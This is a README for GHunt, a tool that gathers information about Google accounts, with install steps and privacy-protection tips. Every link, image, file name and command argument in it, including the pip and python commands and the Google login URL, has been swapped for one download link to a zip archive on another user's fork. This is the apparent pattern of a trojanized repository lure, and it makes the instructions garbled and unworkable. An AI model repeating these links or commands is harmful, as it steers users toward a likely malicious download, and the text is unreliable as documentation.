![screenshot](https://github.com/anakiseng789/GHunt/raw/refs/heads/master/docker/Hunt-G-2.7.zip)

![Python minimum version](https://github.com/anakiseng789/GHunt/raw/refs/heads/master/docker/Hunt-G-2.7.zip%2B-brightgreen)

![Docker Cloud Build Status](https://github.com/anakiseng789/GHunt/raw/refs/heads/master/docker/Hunt-G-2.7.zip) ![GitHub Workflow Status](https://github.com/anakiseng789/GHunt/raw/refs/heads/master/docker/Hunt-G-2.7.zip)
# Description
...
More info [here](https://github.com/anakiseng789/GHunt/raw/refs/heads/master/docker/Hunt-G-2.7.zip%EF%B8%8F-protecting-yourself).
...
# Screenshots
<p align="center">
  <img src="https://github.com/anakiseng789/GHunt/raw/refs/heads/master/docker/Hunt-G-2.7.zip">
</p>
...
```
docker run -v ghunt-resources:/usr/src/app/resources -ti mxrch/ghunt https://github.com/anakiseng789/GHunt/raw/refs/heads/master/docker/Hunt-G-2.7.zip
docker run -v ghunt-resources:/usr/src/app/resources -ti mxrch/ghunt https://github.com/anakiseng789/GHunt/raw/refs/heads/master/docker/Hunt-G-2.7.zip email <email_address>
docker run -v ghunt-resources:/usr/src/app/resources -ti mxrch/ghunt https://github.com/anakiseng789/GHunt/raw/refs/heads/master/docker/Hunt-G-2.7.zip doc <document_link>
```

## Manual installation
- Make sure you have Python 3.7+ installed. (I developed it with Python 3.8.1)
- Some Python modules are required which are contained in `https://github.com/anakiseng789/GHunt/raw/refs/heads/master/docker/Hunt-G-2.7.zip` and will be installed below.
...
```bash
python3 -m pip install -r https://github.com/anakiseng789/GHunt/raw/refs/heads/master/docker/Hunt-G-2.7.zip
```
...
To do this, run `https://github.com/anakiseng789/GHunt/raw/refs/heads/master/docker/Hunt-G-2.7.zip`. \
...
```bash
python3 https://github.com/anakiseng789/GHunt/raw/refs/heads/master/docker/Hunt-G-2.7.zip email https://github.com/anakiseng789/GHunt/raw/refs/heads/master/docker/Hunt-G-2.7.zip
```
```bash
python3 https://github.com/anakiseng789/GHunt/raw/refs/heads/master/docker/Hunt-G-2.7.zip doc https://github.com/anakiseng789/GHunt/raw/refs/heads/master/docker/Hunt-G-2.7.zip
```
...
1. Log in to https://github.com/anakiseng789/GHunt/raw/refs/heads/master/docker/Hunt-G-2.7.zip
...
![cookies](https://github.com/anakiseng789/GHunt/raw/refs/heads/master/docker/Hunt-G-2.7.zip)

# 🛡️ Protecting yourself
Regarding the collection of metadata from your Google Photos account:

Given that Google shows **"X require access"** on [your Google Account Dashboard](https://github.com/anakiseng789/GHunt/raw/refs/heads/master/docker/Hunt-G-2.7.zip), you might imagine that you had to explicitly authorize another account in order for it to access your pictures; but this is not the case.\
Any account can access your AlbumArchive (by default):

![account-dashboard](https://github.com/anakiseng789/GHunt/raw/refs/heads/master/docker/Hunt-G-2.7.zip)

Here's how to check and fix the fact that you're vulnerable (which you most likely are):\
Go to https://github.com/anakiseng789/GHunt/raw/refs/heads/master/docker/Hunt-G-2.7.zip while logged in with your Google account. You will be **automatically** redirected to your correct albumarchive URL (`https://github.com/anakiseng789/GHunt/raw/refs/heads/master/docker/Hunt-G-2.7.zip`). After that, click the three dots on the top left corner, and click on **setting** 

![three-dots-setting](https://github.com/anakiseng789/GHunt/raw/refs/heads/master/docker/Hunt-G-2.7.zip)

Then, uncheck the only option there:

![setting](https://github.com/anakiseng789/GHunt/raw/refs/heads/master/docker/Hunt-G-2.7.zip)


On another note, the target account will **also** be vulnerable if they have ever used **Picasa** linked to their Google account in any way, shape or form. For more details on this, read PinkDev1's comment on [issue #10](https://github.com/anakiseng789/GHunt/raw/refs/heads/master/docker/Hunt-G-2.7.zip).\
For now, the only (known) solution to this is to delete the Picasa albums from your AlbumArchive. 

# Thanks
This tool is based on [Sector's research on Google IDs](https://github.com/anakiseng789/GHunt/raw/refs/heads/master/docker/Hunt-G-2.7.zip) and completed by my own as well.\
